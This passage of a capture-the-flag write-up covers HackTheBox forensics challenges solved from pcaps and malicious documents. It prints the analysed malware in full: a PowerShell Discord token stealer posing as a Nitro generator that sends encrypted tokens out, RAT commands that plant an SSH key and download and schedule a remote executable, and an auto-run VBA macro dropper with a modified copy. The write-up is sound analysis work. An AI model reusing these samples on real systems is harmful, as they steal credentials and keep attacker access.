            $Uri = "https://discord.com/api/v9/users/@me"

            $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers
            return $Response
        }
        catch {}
    }
}

function Create-AesManagedObject($key, $IV, $mode) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"

    if ($mode="CBC") { $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC }
    elseif ($mode="CFB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CFB}
    elseif ($mode="CTS") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CTS}
    elseif ($mode="ECB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB}
    elseif ($mode="OFB"){$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::OFB}


    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $plaintext) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}

Write-Host "
______              ______ _                       _   _   _ _ _               _____  _____  _____   ___ 
|  ___|             |  _  (_)                     | | | \ | (_) |             / __  \|  _  |/ __  \ /   |
| |_ _ __ ___  ___  | | | |_ ___  ___ ___  _ __ __| | |  \| |_| |_ _ __ ___   `' / /'| |/' |`' / /'/ /| |
|  _| '__/ _ \/ _ \ | | | | / __|/ __/ _ \| '__/ _` | | . ` | | __| '__/ _ \    / /  |  /| |  / / / /_| |
| | | | |  __/  __/ | |/ /| \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) | ./ /___\ |_/ /./ /__\___  |
\_| |_|  \___|\___| |___/ |_|___/\___\___/|_|  \__,_| \_| \_/_|\__|_|  \___/  \_____/ \___/ \_____/   |_/
                                                                                                         
                                                                                                         "
Write-Host "Generating Discord nitro keys! Please be patient..."

$local = $env:LOCALAPPDATA
$roaming = $env:APPDATA
$part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"

$paths = @{
    'Google Chrome' = "$local\Google\Chrome\User Data\Default"
    'Brave' = "$local\BraveSoftware\Brave-Browser\User Data\Default\"
    'Opera' = "$roaming\Opera Software\Opera Stable"
    'Firefox' = "$roaming\Mozilla\Firefox\Profiles"
}

$headers = @{
    'Content-Type' = 'application/json'
    'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36'
}

$allTokens = @()
foreach ($platform in $paths.Keys) {
    $currentPath = $paths[$platform]

    if (-not (Test-Path $currentPath -PathType Container)) {continue}

    $tokens = Steal -path $currentPath
    $allTokens += $tokens
}

$userInfos = @()
foreach ($token in $allTokens) {
    $userInfo = Get-DiscordUserInfo -Token $token
    if ($userInfo) {
        $userDetails = [PSCustomObject]@{
            ID = $userInfo.id
            Email = $userInfo.email
            GlobalName = $userInfo.global_name
            Token = $token
        }
        $userInfos += $userDetails
    }
}

$AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
$payload = $userInfos | ConvertTo-Json -Depth 10
$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payload

try {
    $headers = @{
        'Content-Type' = 'text/plain'
        'User-Agent' = 'Mozilla/5.0'
    }
    Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData
}
catch {}

Write-Host "Success! Discord Nitro Keys:"
$keys = GenerateDiscordNitroCodes -numberOfCodes 5 -codeLength 16
$keys | ForEach-Object { Write-Output $_ }
```
The first part: `$part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"`
```
└─$ echo SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf | base64 --decode
HTB{fr33_N17r0G3n_3xp053d!_
```

Reading the code, it seems that an AES key can also be found encoded in base64. At this point I was stuck but my teammate @Miracle0604 mentioned that the malicious file actually steals the victim's infomation and encrypt it with AES, so the information might be sent back to the attacker in the pcap. Filtering by `http.request.method==POST`, we can find the encrypted data on TCP stream 48 and decrypting it gives us the user credentials.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/77b33497-33e9-40e8-91d9-512829ee6b22)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/8a5ca06e-9331-4be7-9552-fd2ad3c7e5f1)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/2970f92e-7130-4d8c-8334-30ac6496d052)

The second part: `"Email": "YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9",`
```
└─$ echo YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9 | base64 --decode
b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}
```

## Task 6: Data Siege 
Question: "It was a tranquil night in the Phreaks headquarters, when the entire district erupted in chaos. Unknown assailants, rumored to be a rogue foreign faction, have infiltrated the city's messaging system and critical infrastructure. Garbled transmissions crackle through the airwaves, spewing misinformation and disrupting communication channels. We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts."

Flag: `HTB{c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5}`

We are given a pcap file again. Analyzing the HTTP packets, we can find a malicious exe file and another weird data file.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/ac1b5729-560e-4759-9d5f-fe15cc635f3f)

Exporting them, I checked the malicious exe file on VirusTotal and found out it was actually called `EZRATClient.exe` and it is .NET-based.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/8c9250f8-f62e-4b17-9aaa-c2993b63e643)

So I had to use `dnSpy` to decompile the malicious exe file and found an encryption and decryption method within the `Program` class. Additionally, the encryption key can also be found.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/71ad361c-3113-4e8e-8a1f-99191846bf0f)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/38649d06-fada-4f80-aa46-98553373fe24)

Thinking that this could be similar to previous challenges, I checked the pcap again to find several encrypted strings in TCP stream 5. So I modified the decryption method by adding the encryption key in it so that it would decrypt the strings.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/1002eed5-772e-4a17-b5d5-a4bffb7dce7d)

```c#
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class Program
{
    public static void Main(string[] args)
    {
        Console.WriteLine("Enter the encrypted text:");
        string encryptedText = Console.ReadLine().Trim();

        // Decrypt the encrypted text
        string decryptedText = Decrypt(encryptedText);

        // Display the result
        Console.WriteLine("Decrypted Text: " + decryptedText);
    }
    
    public static string Decrypt(string cipherText)
    {
        string result;
        try
        {
            string key = "VYAemVeO3zUDTL6N62kVA"; // Add the key
            byte[] array = Convert.FromBase64String(cipherText);
            using (Aes aes = Aes.Create())
            {
                Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(key, new byte[]
                {
                    86, 101, 114, 121, 95, 83, 51, 99, 114, 51, 116, 95, 83
                });
                aes.Key = rfc2898DeriveBytes.GetBytes(32);
                aes.IV = rfc2898DeriveBytes.GetBytes(16);
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(array, 0, array.Length);
                    }
                    cipherText = Encoding.Default.GetString(memoryStream.ToArray());
                }
            }
            result = cipherText;
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
            Console.WriteLine("Cipher Text: " + cipherText);
            result = "error";
        }
        return result;
    }
}
```

The first part:
```
Enter the encrypted text: ZKlcDuS6syl4/w1JGgzkYxeaGTSooLkoI62mUeJh4hZgRRytOHq8obQ7o133pBW7BilbKoUuKeTvXi/2fmd4v+gOO/E6A0DGMWiW2+XZ+lkDa97VsbxXAwm0zhunRyBXHuo8TFbQ3wFkFtA3SBFDe+LRYQFB/Kzk/HX/EomfOj2aDYRGYBCHiGS70BiIC/gyNOW6m0xTu1oZx90SCoFel95v+vi8I8rQ1N6Dy/GPMuhcSWAJ8M9Q2N7fVEz92HWYoi8K5Zvge/7REg/5GKT4pu7KnnFCKNrTp9AqUoPuHm0cWy9J6ZxqwuOXTR8LzbwbmXohANtTGso6Dqbih7aai57uVAktF3/uK5nN7EgMSC0ZsUclzPZjm0r4ITE2HtBrRXJ78cUfIbxd+dIDBGts7IuDfjr0qyXuuzw+5o8pvKkTemvTcNXzNQbSWj+5tTxxly0Kgxi5MVT0ecyJfNfdZG0slqYHKaqJCZm6ShfvGRFsglKmenBB274sBdkVqIRtodB8dD1AM1ZQQX1MBMGDeCwFqc+ahch0x375U6Ekmvf2fzCZ/IaHOHBc8p5se1oNMRbIqcJaundh5cuYL/h8p/NPVTK9veu3Qihy310wkjg=
Decrypted Text: cmd;C:\;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyPZCQyJ/s45lt+cRqPhJj5qrSqd8cvhUaDhwsAemRey2r7Ta+wLtkWZobVIFS4HGzRobAw9s3hmFaCKI8GvfgMsxDSmb0bZcAAkl7cMzhA1F418CLlghANAPFM6Aud7DlJZUtJnN2BiTqbrjPmBuTKeBxjtI0uRTXt4JvpDKx9aCMNEDKGcKVz0KX/hejjR/Xy0nJxHWKgudEz3je31cVow6kKqp3ZUxzZz9BQlxU5kRp4yhUUxo3Fbomo6IsmBydqQdB+LbHGURUFLYWlWEy+1otr6JBwpAfzwZOYVEfLypl3Sjg+S6Fd1cH6jBJp/mG2R2zqCKt3jaWH5SJz13 HTB{c0mmun1c4710n5 >> C:\Users\svc01\.ssh\authorized_keys
```

The second part:
```
Enter the encrypted text: zVmhuROwQw02oztmJNCvd2v8wXTNUWmU3zkKDpUBqUON+hKOocQYLG0pOhERLdHDS+yw3KU6RD9Y4LDBjgKeQnjml4XQMYhl6AFyjBOJpA4UEo2fALsqvbU4Doyb/gtg 
Decrypted Text: cmd;C:\;Username: svc01
Password: Passw0rdCorp5421

2nd flag part: _h45_b33n_r357
```

The third part:
```
(New-Object System.Net.WebClient).DownloadFile("https://windowsliveupdater.com/4fva.exe", "C:\Users\svc01\AppData\Roaming\4fva.exe")

$action = New-ScheduledTaskAction -Execute "C:\Users\svc01\AppData\Roaming\4fva.exe"

$trigger = New-ScheduledTaskTrigger -Daily -At 2:00AM

$settings = New-ScheduledTaskSettingsSet

# 3th flag part:

Register-ScheduledTask -TaskName "0r3d_1n_7h3_h34dqu4r73r5}" -Action $action -Trigger $trigger -Settings $settings
```

For the third part, it is just encoded with base64 using powershell.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/7d34285a-1f67-4b3b-9137-2429b085ad61)

## Task 7: Phreaky
Question: In the shadowed realm where the Phreaks hold sway,
A mole lurks within, leading them astray.
Sending keys to the Talents, so sly and so slick,
A network packet capture must reveal the trick.
Through data and bytes, the sleuth seeks the sign,
Decrypting messages, crossing the line.
The traitor unveiled, with nowhere to hide,
Betrayal confirmed, they'd no longer abide.

Flag: `HTB{Th3Phr3aksReadyT0Att4ck}`

We are given yet another pcap file. Analyzing it, it seems that there are several TCP, HTTP and SMTP packets. Going through the files, it seems that zip files were being sent in several parts between two users via email. So I extracted each email one by one and extracted the attachments from each of them (not recommended, make a script please).

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/ed1e5c3a-8c5c-4bc8-bc38-1c46410e4e82)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/afe5ba5d-f097-4b88-8a8e-1b5caf9c5fd2)

After extracting every zip file and their content, we have multiple parts of a pdf file.

```
└─$ file *                                                                                                                            
phreaks_plan.pdf:        data
phreaks_plan.pdf.part2:  data
phreaks_plan.pdf.part3:  data
phreaks_plan.pdf.part4:  data
phreaks_plan.pdf.part5:  data
phreaks_plan.pdf.part6:  data
phreaks_plan.pdf.part7:  data
phreaks_plan.pdf.part8:  data
phreaks_plan.pdf.part9:  data
phreaks_plan.pdf.part10: OpenPGP Secret Key
phreaks_plan.pdf.part11: data
phreaks_plan.pdf.part12: ASCII text
phreaks_plan.pdf.part13: ASCII text
phreaks_plan.pdf.part14: ASCII text
phreaks_plan.pdf.part15: ASCII text
```

So I made a script to merge the data together into one complete pdf file. Since there were binary and ASCII data, the script must append the binary file into the ASCII parts to actually form the pdf file. However, the pdf can only be viewed on Linux because `PyPDF` does not look for magic bytes unlike other PDF software.

```python
import subprocess

# Define the output file name
output_file = "phreaks_plan.pdf"

# Open the output file in binary append mode
with open(output_file, "ab") as output_pdf:

    # Concatenate binary parts directly into the output file
    for i in range(2, 16):
        part_filename = f"phreaks_plan.pdf.part{i}"
        file_type = subprocess.run(["file", part_filename], capture_output=True, text=True, shell=True)
        
        # Check if the file is binary
        if "ASCII" not in file_type.stdout:
            with open(part_filename, "rb") as binary_file:
                output_pdf.write(binary_file.read())

print("Merging completed. Output file:", output_file)
```

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/41a84d0f-ce46-4f4e-83f2-e64373aaa0f9)

## Task 8: Game Invitation
Question: In the bustling city of KORP™, where factions vie in The Fray, a mysterious game emerges. As a seasoned faction member, you feel the tension growing by the minute. Whispers spread of a new challenge, piquing both curiosity and wariness. Then, an email arrives: "Join The Fray: Embrace the Challenge." But lurking beneath the excitement is a nagging doubt. Could this invitation hide something more sinister within its innocent attachment?

Flag: `HTB{m4ld0cs_4r3_g3tt1ng_Tr1cki13r}`

We are given a .docm file which could suggest a macro-enabled Word documenet file. Using `oledump`, the macro can be dumped for further investigation.

```powershell
PS C:\Users\ooiro\Desktop\oledump_V0_0_75> python .\oledump.py C:\Users\ooiro\Downloads\forensics_game_invitation\invitation.docm
C:\Users\ooiro\Desktop\oledump_V0_0_75\oledump.py:186: SyntaxWarning: invalid escape sequence '\D'
  manual = '''
A: word/vbaProject.bin
 A1:       424 'PROJECT'
 A2:        71 'PROJECTwm'
 A3: M    5275 'VBA/NewMacros'
 A4: m     946 'VBA/ThisDocument'
 A5:      3611 'VBA/_VBA_PROJECT'
 A6:       571 'VBA/dir'
```

<details>
<summary>
Macro
</summary>
  
```vba
Public IAiiymixt    As String
Public kWXlyKwVj    As String

Function JFqcfEGnc(given_string() As Byte, length As Long) As Boolean
    Dim xor_key     As Byte
    xor_key = 45
    For i = 0 To length - 1
        given_string(i) = given_string(i) Xor xor_key
        xor_key = ((xor_key Xor 99) Xor (i Mod 254))
    Next i
    JFqcfEGnc = TRUE
End Function

Sub AutoClose()        'delete the js script'
    On Error Resume Next
    Kill IAiiymixt
    On Error Resume Next
    Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
    aMUsvgOin.DeleteFile kWXlyKwVj & "\*.*", TRUE
    Set aMUsvgOin = Nothing
End Sub

Sub AutoOpen()
    On Error GoTo MnOWqnnpKXfRO
    Dim chkDomain   As String
    Dim strUserDomain As String
    chkDomain = "GAMEMASTERS.local"
    strUserDomain = Environ$("UserDomain")
    If chkDomain <> strUserDomain Then
        
    Else
        
        Dim gIvqmZwiW
        Dim file_length As Long
        Dim length  As Long
        file_length = FileLen(ActiveDocument.FullName)
        gIvqmZwiW = FreeFile
        Open (ActiveDocument.FullName) For Binary As #gIvqmZwiW
        Dim CbkQJVeAG() As Byte
        ReDim CbkQJVeAG(file_length)
        Get #gIvqmZwiW, 1, CbkQJVeAG
        Dim SwMbxtWpP As String
        SwMbxtWpP = StrConv(CbkQJVeAG, vbUnicode)
        Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
        Dim vTxAnSEFH
        Set vTxAnSEFH = CreateObject("vbscript.regexp")
        vTxAnSEFH.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
        Set I4j833DS5SFd34L3gwYQD = vTxAnSEFH.Execute(SwMbxtWpP)
        Dim Y5t4Ul7o385qK4YDhr
        If I4j833DS5SFd34L3gwYQD.Count = 0 Then
            GoTo MnOWqnnpKXfRO
        End If
        For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
            Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
            Exit For
        Next
        Dim Wk4o3X7x1134j() As Byte
        Dim KDXl18qY4rcT As Long
        KDXl18qY4rcT = 13082
        ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
        Get #gIvqmZwiW, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j
        If Not JFqcfEGnc(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
            GoTo MnOWqnnpKXfRO
        End If
        kWXlyKwVj = Environ("appdata") & "\Microsoft\Windows"
        Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
        If Not aMUsvgOin.FolderExists(kWXlyKwVj) Then
            kWXlyKwVj = Environ("appdata")
        End If
        Set aMUsvgOin = Nothing
        Dim K764B5Ph46Vh
        K764B5Ph46Vh = FreeFile
        IAiiymixt = kWXlyKwVj & "\" & "mailform.js"
        Open (IAiiymixt) For Binary As #K764B5Ph46Vh
        Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
        Close #K764B5Ph46Vh
        Erase Wk4o3X7x1134j
        Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
        R66BpJMgxXBo2h.Run """" + IAiiymixt + """" + " vF8rdgMHKBrvCoCp0ulm"
        ActiveDocument.Save
        Exit Sub
        MnOWqnnpKXfRO:
        Close #K764B5Ph46Vh
        ActiveDocument.Save
    End If
End Sub
```
</details>

Reading the macro, there seems to be two important Sub procedures: `AutoClose()` and `AutoOpen()`. After reading the macro for 2 hours (no joke), I can briefly understand its functions.

1. XOR Key Generation: The program generates a XOR key for encryption.
2. AutoClose(): Occurs when the ueser closes the document. It removes a JavaScript file from the system.
3. AutoOpen(): Occurs when the user opens the document. It verifies if the user's domain matches "GAMEMASTERS.local". If it does, the program reads the document content into a binary array which is converted again into a Unicode string. The program then uses a regular expression to search for a specific pattern within the content.
4. Encryption: If the pattern is found, a portion of the document content is encrypted using the XOR key generated earlier.
5. File Dropping: The program also drops a JavaScript file to the `%APPDATA%\Microsoft\Windows\` path.

TL;DR: it seems that the macro has to be slightly modified so the Javascript file can be dropped properly into the path. I modified the domain name to match my own domain name "ROGLAPTOP" and made sure the Javascript file is decrypted first before dropping it to my Downloads directory. I also removed the `AutoClose()` procedure so the Javascript file will not be deleted after closing the Word document.

<details>
<summary>
Modified Macro
</summary>
  
```vba
Public IAiiymixt As String
Public kWXlyKwVj As String

Function JFqcfEGnc(given_string() As Byte, length As Long) As Boolean
    Dim xor_key As Byte
    xor_key = 45
    For i = 0 To length - 1
        given_string(i) = given_string(i) Xor xor_key
        xor_key = ((xor_key Xor 99) Xor (i Mod 254))
    Next i
    JFqcfEGnc = TRUE
End Function

Sub AutoOpen()
    On Error GoTo MnOWqnnpKXfRO
    Dim chkDomain   As String
    Dim strUserDomain As String
    chkDomain = "ROGLAPTOP"
    strUserDomain = Environ$("UserDomain")
    If chkDomain <> strUserDomain Then
        
    Else
        
        Dim gIvqmZwiW
        Dim file_length As Long
        Dim length  As Long
        file_length = FileLen(ActiveDocument.FullName)
        gIvqmZwiW = FreeFile
        Open (ActiveDocument.FullName) For Binary As #gIvqmZwiW
        Dim CbkQJVeAG() As Byte
        ReDim CbkQJVeAG(file_length)
        Get #gIvqmZwiW, 1, CbkQJVeAG
        Dim SwMbxtWpP As String
        SwMbxtWpP = StrConv(CbkQJVeAG, vbUnicode)
        Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
        Dim vTxAnSEFH
        Set vTxAnSEFH = CreateObject("vbscript.regexp")
        vTxAnSEFH.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
        Set I4j833DS5SFd34L3gwYQD = vTxAnSEFH.Execute(SwMbxtWpP)
        Dim Y5t4Ul7o385qK4YDhr
        If I4j833DS5SFd34L3gwYQD.Count = 0 Then
            GoTo MnOWqnnpKXfRO
        End If
        For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
            Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
            Exit For
        Next
        Dim Wk4o3X7x1134j() As Byte
        Dim KDXl18qY4rcT As Long
        KDXl18qY4rcT = 13082
        ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
        Get #gIvqmZwiW, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j
        If Not JFqcfEGnc(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
            GoTo MnOWqnnpKXfRO
        End If
        kWXlyKwVj = Environ("appdata") & "\Microsoft\Windows"
        Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
        If Not aMUsvgOin.FolderExists(kWXlyKwVj) Then
            kWXlyKwVj = Environ("appdata")
        End If
        Set aMUsvgOin = Nothing
        Dim K764B5Ph46Vh
        K764B5Ph46Vh = FreeFile
        IAiiymixt = kWXlyKwVj & "\" & "mailform.js"
        Open (IAiiymixt) For Binary As #K764B5Ph46Vh
        Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
        Close #K764B5Ph46Vh
        Erase Wk4o3X7x1134j
        Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
        R66BpJMgxXBo2h.Run """" + IAiiymixt + """" + " vF8rdgMHKBrvCoCp0ulm"
        ActiveDocument.Save
        Exit Sub
        MnOWqnnpKXfRO:
        Close #K764B5Ph46Vh
        ActiveDocument.Save
    End If
End Sub
```
</details>

Next, the decrypted Javascript file seems to have a ciphertext assigned to variable `r` which is encoded with base64 and an encryption method. However, a key was needed to decrypt the ciphertext. Reading the code, the `WScript.Arguments` seems like it was calling arguments from another script (possibly the macro). Going back to the macro, a key can be found within the `WScript.Shell` command at the bottom of the macro code.

<details>
<summary>
First Javascript file
</summary>

```js
var lVky = WScript.Arguments;
var DASz = lVky(0);
var Iwlh = lyEK();
Iwlh = JrvS(Iwlh);
Iwlh = xR68(DASz, Iwlh);
eval(Iwlh);

function af5Q(r) {
    var a = r.charCodeAt(0);
    if (a === 43 || a === 45) return 62;
    if (a === 47 || a === 95) return 63;
    if (a < 48) return -1;
    if (a < 48 + 10) return a - 48 + 26 + 26;
    if (a < 65 + 26) return a - 65;
    if (a < 97 + 26) return a - 97 + 26
}

function JrvS(r) {
    var a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var t;
    var l;
    var h;
    if (r.length % 4 > 0) return;
    var u = r.length;
    var g = r.charAt(u - 2) === "=" ? 2 : r.charAt(u - 1) === "=" ? 1 : 0;
    var n = new Array(r.length * 3 / 4 - g);
    var i = g > 0 ? r.length - 4 : r.length;
    var z = 0;

    function b(r) {
        n[z++] = r
    }
    for (t = 0, l = 0; t < i; t += 4, l += 3) {
        h = af5Q(r.charAt(t)) << 18 | af5Q(r.charAt(t + 1)) << 12 | af5Q(r.charAt(t + 2)) << 6 | af5Q(r.charAt(t + 3));
        b((h & 16711680) >> 16);
        b((h & 65280) >> 8);
        b(h & 255)
    }
    if (g === 2) {
        h = af5Q(r.charAt(t)) << 2 | af5Q(r.charAt(t + 1)) >> 4;
        b(h & 255)
    } else if (g === 1) {
        h = af5Q(r.charAt(t)) << 10 | af5Q(r.charAt(t + 1)) << 4 | af5Q(r.charAt(t + 2)) >> 2;
        b(h >> 8 & 255);
        b(h & 255)
    }
    return n
}

function xR68(r, a) {
    var t = [];
    var l = 0;
    var h;
    var u = "";
    for (var g = 0; g < 256; g++) {
        t[g] = g
    }
    for (var g = 0; g < 256; g++) {
        l = (l + t[g] + r.charCodeAt(g % r.length)) % 256;
        h = t[g];
        t[g] = t[l];
        t[l] = h
    }
    var g = 0;
    var l = 0;
    for (var n = 0; n < a.length; n++) {
        g = (g + 1) % 256;
        l = (l + t[g]) % 256;
        h = t[g];
        t[g] = t[l];
        t[l] = h;
        u += String.fromCharCode(a[n] ^ t[(t[g] + t[l]) % 256])
    }
    return u
}

function lyEK() {
    var r = "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